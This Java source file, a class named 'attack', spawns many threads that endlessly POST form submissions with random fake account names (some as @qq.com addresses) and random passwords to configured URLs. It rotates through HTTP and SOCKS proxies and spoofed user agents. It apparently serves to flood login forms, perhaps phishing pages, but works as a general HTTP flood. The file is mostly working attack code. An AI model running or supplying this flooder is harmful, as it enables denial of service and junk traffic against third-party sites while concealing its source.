import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URL;
import java.util.Random;
//import java.io.BufferedReader;
//import java.io.InputStreamReader;

public class attack implements Runnable {
    static String[] proxyhttp;
    static String[] proxysocks;
    static boolean proxyhttpswich = false;
    static boolean proxysocksswich = false;
    static Random random = new Random();

    protected static void start() {
        if (file.proxyswitch) {
            proxyhttp = murl.readhttp(file.proxyfile);
            if (proxyhttp != null) {
                proxyhttpswich = true;
            }
            proxysocks = murl.readsocks(file.proxyfile);
            if (proxysocks != null) {
                proxysocksswich = true;
            }
        }
        for (int i = 0; i < file.thnum; i++) {
            new Thread(new attack()).start();
        }
    }

    public void run() {
        int max = 16;
        int min = 8;
        final String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*";
        // proxy
        String proxytype = "";
        String proxyurl = "";
        String[] proxyiurl = { "", "" };
        String proxyhost = "";
        int proxyport = 0;
        if (file.proxyswitch) {
            if (proxyhttpswich && proxysocksswich) {
                if (random.nextBoolean()) {
                    proxytype = "http";
                    proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
                } else {
                    proxytype = "socks";
                    proxyurl = proxysocks[random.nextInt(proxysocks.length)];
                }
            } else if (proxyhttpswich && !proxysocksswich) {
                proxytype = "http";
                proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
            } else if (!proxyhttpswich && proxysocksswich) {
                proxytype = "socks";
                proxyurl = proxysocks[random.nextInt(proxysocks.length)];
            }
            proxyiurl = murl.iurl(proxyurl);
            proxyhost = proxyiurl[0];
            proxyport = Integer.valueOf(proxyiurl[1]);
        }
        while (true) {
            // url
            String url;
            if (file.urls.length - 1 == 0) {
                url = file.urls[0];
            } else
                url = file.urls[random.nextInt(file.urls.length - 1)].toString();
            // name
            String rn;
            Long brn = (long) (Math.random() * (99999999999l - 10000000)) + 1000000;
            switch (random.nextInt(2) + 1) {
                case 1:
                    int length = random.nextInt(99999999 - 10000000) + 10000000;
                    rn = array.bfnum[random.nextInt(array.bfnum.length)].toString() + length;
                    break;
                case 2:
                    rn = brn.toString() + "@qq.com";
                    break;
                case 3:
                default:
                    rn = brn.toString();
                    break;
            }
            // rp
            int rp = random.nextInt(max - min) + min;
            StringBuffer pass = new StringBuffer();
            for (int i = 0; i < rp; i++) {
                int randomInt = random.nextInt(str.length());
                pass.append(str.charAt(randomInt));
            }
            // 输出
            if (file.genoutput) {
                System.out.println(rn.toString() + " " + pass.toString());
            }
            go(rn.toString(), pass.toString(), url, proxytype, proxyhost, proxyport);
        }
    }

    private static void go(String name, String pass, String surl, String proxytype, String proxyurl, int proxyport) {
        HttpURLConnection httpURLConnection = null;
        try {
            URL url = new URL(surl);
            if (proxytype == "" && proxyurl == "") {
                httpURLConnection = (HttpURLConnection) url.openConnection();
            } else {
                if (proxytype == "http") {
                    Proxy proxy = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyurl, proxyport));
                    httpURLConnection = (HttpURLConnection) url.openConnection(proxy);
                } else if (proxytype == "socks") {
                    Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress(proxyurl, proxyport));
                    httpURLConnection = (HttpURLConnection) url.openConnection(proxy);
                }
            }
            httpURLConnection.setRequestMethod(file.method);
            // 超时时间
            httpURLConnection.setConnectTimeout(3000);
            // 设置是否输出
            httpURLConnection.setDoOutput(true);
            // 设置是否读入
            httpURLConnection.setDoInput(true);
            // 设置是否使用缓存
            httpURLConnection.setUseCaches(true);
            // 设置此 HttpURLConnection 实例是否应该自动执行 HTTP 重定向
            httpURLConnection.setInstanceFollowRedirects(true);
            // 设置请求头
            httpURLConnection.setRequestProperty("Content-Length", "40");
            httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            httpURLConnection.setRequestProperty("User-Agent",
                    array.useragent[random.nextInt(array.useragent.length - 1)]);
            // 连接
            httpURLConnection.connect();
            /* 4. 处理输入输出 */
            // 写入参数到请求中
            String param = file.param.replace("$[account]", name);
            param = param.replace("$[password]", pass);
            OutputStream out = httpURLConnection.getOutputStream();
            out.write(param.getBytes());
            // 简化
            // httpURLConnection.getOutputStream().write(params.getBytes());
            out.flush();
            out.close();
            // 从连接中读取响应信息
            // String msg = "";
            // int code = httpURLConnection.getResponseCode();
            // if (code == 200) {
            // BufferedReader reader = new BufferedReader(
            // new InputStreamReader(httpURLConnection.getInputStream()));
            // String line;
            // while ((line = reader.readLine()) != null) {
            // msg += line + "\n";
            // }
            // reader.close();
            // }
            // 处理结果
            // System.out.println(msg);
        } catch (IOException e) {
            System.out.println(surl + " 转发出错，错误信息：" + e.getLocalizedMessage() + ";" + e.getClass());
        } finally {
            // 5. 断开连接
            if (null != httpURLConnection) {
                try {
                    httpURLConnection.disconnect();
                } catch (Exception e) {
                    System.out.println(surl + " httpURLConnection 流关闭异常：" + e.getLocalizedMessage());
                }
            }
        }
    }
}